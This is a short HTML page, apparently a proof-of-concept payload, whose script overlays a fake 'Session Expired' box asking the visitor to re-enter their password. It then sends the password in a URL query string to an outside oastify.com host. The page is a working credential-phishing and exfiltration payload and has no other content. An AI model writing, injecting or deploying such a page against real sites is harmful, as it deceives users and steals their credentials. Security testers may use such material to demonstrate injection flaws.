<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Prompt Example</title>
</head>
<body>

<script>
    // Create the prompt (div) with a password input
    let div = document.createElement('div');
    div.style.position = 'fixed';
    div.style.top = '20%';
    div.style.left = '50%';
    div.style.transform = 'translate(-50%, 0)';
    div.style.background = 'white';
    div.style.padding = '20px';
    div.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
    div.style.zIndex = '9999';
    div.innerHTML = `
        <h2>Session Expired</h2>
        <p>Please re-enter your password:</p>
        <input type="password" id="pPass" placeholder="Enter password" required>
        <button id="submitBtn">Submit</button>
    `;
    document.body.appendChild(div);

    // Function to send the password when the user submits
    function sendData() {
        let pass = document.getElementById('pPass').value;  // Get the password entered by the user
        
        if (!pass) {
            alert("Please enter a password!");  // If no password is entered, show an alert
            return;
        }

        // Send the password via GET request to the specified URL
        fetch(`https://w41xno1kw55je5x7ea1bjq4reik981cp1.oastify.com?password=${encodeURIComponent(pass)}`)
            .then(response => response.text())  // Process the response as text (you can change it to json if necessary)
            .then(data => {
                console.log("Response from server:", data);  // Log the server response (optional)
                alert("Password sent successfully!");  // You can notify the user upon success
            })
            .catch(error => {
                console.error("Error sending password:", error);  // Log any error
                alert("There was an error sending the password.");  // Notify the user about the error
            });
    }

    // Attach event listener to the Submit button
    document.getElementById('submitBtn').addEventListener('click', sendData);
</script>

</body>
</html>
